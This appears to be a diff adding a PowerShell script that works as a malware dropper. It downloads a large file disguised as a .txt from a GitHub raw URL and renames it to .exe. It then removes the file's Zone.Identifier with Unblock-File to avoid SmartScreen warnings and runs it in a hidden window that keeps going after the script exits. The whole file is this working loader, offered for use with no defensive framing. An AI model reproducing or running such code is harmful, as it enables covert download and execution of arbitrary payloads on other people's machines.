@@ -1,0 +1,158 @@
+<#
+.SYNOPSIS
+    Downloads a TXT file > 10 MB, converts it to EXE, and runs it hidden & detached.
+.DESCRIPTION
+    This script tries multiple URLs until it downloads a .txt file larger than 10 MB.
+    It then renames the file to .exe, removes the Internet Zone Identifier (unblocks),
+    and starts the executable in a hidden window as a separate process that survives
+    the script's termination.
+.NOTES
+    - Uses .NET HttpWebRequest for download (timeout supported everywhere).
+    - If no URL succeeds, the script exits with an error.
+.EXAMPLE
+    .\Advanced-Downloader.ps1
+    (Edit the $UrlList variable to include your actual URLs.)
+#>
+
+# -------------------- CONFIGURATION --------------------
+$UrlList    = @(
+    "https://raw.githubusercontent.com/hellow2003/phpcode/main/dirfinal.txt",
+
+)
+$TimeoutSec = 600          # Timeout per download attempt
+$TempDir    = $env:TEMP   # Use system temporary folder
+$BaseName   = "load9"   # Prefix for downloaded files
+
+# -------------------- FUNCTIONS --------------------
+function Download-WithTimeout {
+    <#
+    .SYNOPSIS
+        Downloads a file using HttpWebRequest with a configurable timeout.
+    .PARAMETER Uri
+        The URL of the file to download.
+    .PARAMETER OutFile
+        Local path where the file will be saved.
+    .PARAMETER TimeoutSec
+        Timeout in seconds.
+    #>
+    param(
+        [string]$Uri,
+        [string]$OutFile,
+        [int]$TimeoutSec = 30
+    )
+
+    $request = [System.Net.HttpWebRequest]::Create($Uri)
+    $request.Timeout         = $TimeoutSec * 1000
+    $request.ReadWriteTimeout = $TimeoutSec * 1000
+    $request.UserAgent       = "PowerShell-Downloader/1.0"
+
+    try {
+        $response = $request.GetResponse()
+        $stream   = $response.GetResponseStream()
+        $fileStream = [System.IO.File]::Create($OutFile)
+        try {
+            $stream.CopyTo($fileStream)
+        }
+        finally {
+            $fileStream.Close()
+            $stream.Close()
+            $response.Close()
+        }
+        return $true
+    }
+    catch [System.Net.WebException] {
+        # Re-throw with a clean message
+        throw "Download failed: $($_.Exception.Message)"
+    }
+}
+
+# -------------------- MAIN LOGIC --------------------
+# Make sure temp directory exists
+if (-not (Test-Path $TempDir)) {
+    New-Item -ItemType Directory -Path $TempDir -Force | Out-Null
+}
+
+$downloadedFile = $null
+$success        = $false
+
+foreach ($url in $UrlList) {
+    Write-Verbose "Attempting download from: $url"
+
+    # Create a unique temporary file name
+    $timestamp    = Get-Date -Format 'yyyyMMddHHmmss'
+    $tempTxtPath  = Join-Path -Path $TempDir -ChildPath "$BaseName`_$timestamp.txt"
+
+    try {
+        Download-WithTimeout -Uri $url -OutFile $tempTxtPath -TimeoutSec $TimeoutSec
+
+        # Verify the file exists and get its size
+        if (-not (Test-Path $tempTxtPath)) {
+            Write-Warning "Downloaded file not found after attempt: $tempTxtPath"
+            continue
+        }
+
+        $fileSize   = (Get-Item $tempTxtPath).Length
+        $fileSizeMB = [math]::Round($fileSize / 1MB, 2)
+        Write-Verbose "Downloaded size: $fileSizeMB MB"
+
+        if ($fileSize -le 10MB) {
+            Write-Warning "File too small ($fileSizeMB MB ≤ 10 MB). Deleting & trying next URL."
+            Remove-Item -Path $tempTxtPath -Force -ErrorAction SilentlyContinue
+            continue
+        }
+
+        # File meets the size requirement
+        $downloadedFile = $tempTxtPath
+        $success        = $true
+        break
+    }
+    catch {
+        Write-Warning "Download from '$url' failed: $_"
+        # Clean up partial download
+        if (Test-Path $tempTxtPath) {
+            Remove-Item -Path $tempTxtPath -Force -ErrorAction SilentlyContinue
+        }
+    }
+}
+
+# If all URLs failed, abort
+if (-not $success) {
+    Write-Error "Could not download a .txt file > 10 MB from any URL. Exiting."
+    exit 1
+}
+
+# -------------------- RENAME TO .EXE --------------------
+$exePath = [System.IO.Path]::ChangeExtension($downloadedFile, ".exe")
+try {
+    Move-Item -Path $downloadedFile -Destination $exePath -Force -ErrorAction Stop
+    Write-Verbose "Renamed to: $exePath"
+}
+catch {
+    Write-Error "Failed to rename file: $_"
+    exit 1
+}
+
+# -------------------- UNBLOCK (remove Zone.Identifier) --------------------
+try {
+    Unblock-File -Path $exePath -ErrorAction Stop
+    Write-Verbose "File unblocked (Zone.Identifier removed)."
+}
+catch {
+    Write-Warning "Could not unblock file: $_"
+    # The .exe may still run, but SmartScreen could warn the user.
+}
+
+# -------------------- LAUNCH HIDDEN & DETACHED --------------------
+try {
+    $process = Start-Process -FilePath $exePath -WindowStyle Hidden -PassThru
+    Write-Verbose "Launched independent process (PID: $($process.Id))."
+    # Brief pause to let the process initialise
+    Start-Sleep -Seconds 1
+}
+catch {
+    Write-Error "Failed to start executable: $_"
+    exit 1
+}
+
+# Script exits gracefully while the .exe keeps running
+exit 0
